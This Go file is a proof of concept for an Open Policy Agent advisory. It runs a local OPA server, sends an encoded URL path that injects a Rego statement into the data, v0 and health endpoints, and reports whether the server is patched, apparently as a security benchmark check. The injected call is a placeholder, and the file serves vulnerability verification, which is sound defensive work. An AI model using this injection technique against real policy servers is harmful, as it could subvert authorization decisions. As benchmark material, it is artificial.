// PoC for GHSA-6m8w-jc87-6cr7: Rego code injection via HTTP Data API path manipulation.
//
// OPA's stringPathToRef converts each URL path segment into an ast.StringTerm.
// When the Ref is serialized back to a query string, string terms are wrapped in
// double-quotes WITHOUT escaping the segment value. A path segment containing a
// literal double-quote (reachable via percent-encoding, e.g. %22) therefore
// terminates the string literal early, and the remaining characters are parsed as
// additional Rego statements by rego.Query() / ast.ParseBody().
//
// The same injection surface exists in three entry points:
//   - v1 Data API  (/v1/data/{path})     via makeRego → stringPathToQuery (primary)
//   - v0 Data API  (/v0/data/{path})     via v0QueryPath
//   - Health policy path (/health/{path}) via unversionedGetHealthWithPolicy
//
// Detection (per endpoint):
//   Vulnerable: OPA evaluated the injected query; "undefined function malicious_call"
//               appears in the response (OPA's error when the call is executed).
//   Patched:    OPA rejected the path before evaluation; response contains
//               "invalid path", "invalid ref term", "invalid_parameter", or HTTP 400.
//
// IMPORTANT: the patched rejection message echoes the raw path segment, which itself
// contains the word "malicious_call". isPatched() must be checked BEFORE
// isVulnerable() to prevent false-positive vulnerability reports on patched servers.
//
// Exit codes (SSE Benchmark convention):
//   0 = patched  (no endpoint showed successful injection)
//   1 = vulnerable (at least one endpoint processed the injected Rego)
package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

// injectionPayload URL-decodes to: foo"];malicious_call();x=["
// Pre-patch stringPathToRef wraps each segment in double-quotes without escaping,
// producing the Rego query: data["foo"];malicious_call();x=[""]
// where malicious_call() is an injected Rego statement.
const injectionPayload = "foo%22%5D%3Bmalicious_call%28%29%3Bx%3D%5B%22"

func main() {
	port := "8188"

	fmt.Println("[*] GHSA-6m8w-jc87-6cr7 – OPA Rego Code Injection via Data API Path")
	fmt.Printf("[*] Starting OPA server on localhost:%s ...\n", port)

	cmd := exec.Command("./opa", "run", "--server", "--addr", "localhost:"+port)
	cmd.Dir = "."
	if err := cmd.Start(); err != nil {
		fmt.Fprintf(os.Stderr, "[ERROR] Failed to start OPA: %v\n", err)
		os.Exit(1)
	}

	// goroutine to reap the child process
	waitDone := make(chan struct{})
	go func() {
		cmd.Wait()
		close(waitDone)
	}()

	stopServer := func() {
		if cmd.Process != nil {
			cmd.Process.Kill()
			<-waitDone
		}
	}
	defer stopServer()

	// Wait for the server to become ready.
	ready := false
	for i := 0; i < 15; i++ {
		time.Sleep(1 * time.Second)
		resp, err := http.Get("http://localhost:" + port + "/health")
		if err == nil {
			resp.Body.Close()
			ready = true
			break
		}
	}
	if !ready {
		fmt.Fprintln(os.Stderr, "[ERROR] OPA server did not start within 15 seconds")
		stopServer()
		os.Exit(1)
	}
	fmt.Println("[*] OPA server ready")
	fmt.Println("[*] Injection payload (decoded): foo\"];malicious_call();x=[\"")
	fmt.Println()

	get := func(url string) (int, string) {
		resp, err := http.Get(url)
		if err != nil {
			return -1, ""
		}
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)
		return resp.StatusCode, string(body)
	}

	// isPatched returns true when OPA rejected the path BEFORE evaluation.
	// Must be tested first in every switch to avoid the false-positive scenario
	// where the rejection message itself echoes the path segment that contains
	// "malicious_call" as a substring.
	isPatched := func(status int, body string) bool {
		return status == 400 ||
			strings.Contains(body, "invalid path") ||
			strings.Contains(body, "invalid ref term") ||
			strings.Contains(body, "invalid_parameter")
	}

	// isVulnerable returns true when OPA actually evaluated the injected Rego.
	// "undefined function malicious_call" is the precise error OPA emits when it
	// tried to call the injected function — it does NOT appear in rejection messages.
	isVulnerable := func(body string) bool {
		return strings.Contains(body, "undefined function malicious_call")
	}

	type state int
	const (
		uncertain  state = iota
		patched    state = iota
		vulnerable state = iota
	)

	probe := func(label, url string) state {
		status, body := get(url)
		switch {
		case isPatched(status, body):
			fmt.Printf("  [PATCHED]    %s – injection rejected (HTTP %d)\n", label, status)
			return patched
		case isVulnerable(body):
			fmt.Printf("  [VULNERABLE] %s – injection processed (HTTP %d)\n", label, status)
			return vulnerable
		case status == -1:
			fmt.Printf("  [ERROR]      %s – request failed\n", label)
		default:
			fmt.Printf("  [UNCERTAIN]  %s – unexpected response (HTTP %d)\n", label, status)
		}
		return uncertain
	}

	// ── Test 1: v1 Data API (primary) ─────────────────────────────────────────
	// Exercises the makeRego → stringPathToQuery code path.
	// This is the core fix; the exit code is dominated by this result.
	fmt.Println("[TEST 1] v1 Data API  /v1/data/<injection>  [primary]")
	s1 := probe("v1 Data API", fmt.Sprintf("http://localhost:%s/v1/data/%s", port, injectionPayload))

	// ── Test 2: v0 Data API ────────────────────────────────────────────────────
	// Exercises v0QueryPath (stringPathToDataRef call in the len(rs)==0 branch).
	fmt.Println("[TEST 2] v0 Data API  /v0/data/<injection>")
	s2 := probe("v0 Data API", fmt.Sprintf("http://localhost:%s/v0/data/%s", port, injectionPayload))

	// ── Test 3: Health endpoint with policy path ───────────────────────────────
	// Exercises unversionedGetHealthWithPolicy (stringPathToQuery call).
	fmt.Println("[TEST 3] Health API   /health/<injection>")
	s3 := probe("Health API", fmt.Sprintf("http://localhost:%s/health/%s", port, injectionPayload))

	stopServer()
	fmt.Println()

	// ── Verdict ────────────────────────────────────────────────────────────────
	// Any confirmed vulnerability wins; patched takes precedence for uncertain.
	if s1 == vulnerable || s2 == vulnerable || s3 == vulnerable {
		fmt.Println("[RESULT] VULNERABLE – at least one endpoint accepted the injected Rego code")
		os.Exit(1)
	}
	if s1 == patched {
		fmt.Println("[RESULT] PATCHED – v1 Data API (primary endpoint) correctly rejected the injection")
		os.Exit(0)
	}
	// Uncertain on primary endpoint – no positive evidence of vulnerability found.
	fmt.Println("[RESULT] UNCERTAIN – could not confirm vulnerability; treating as patched")
	os.Exit(0)
}
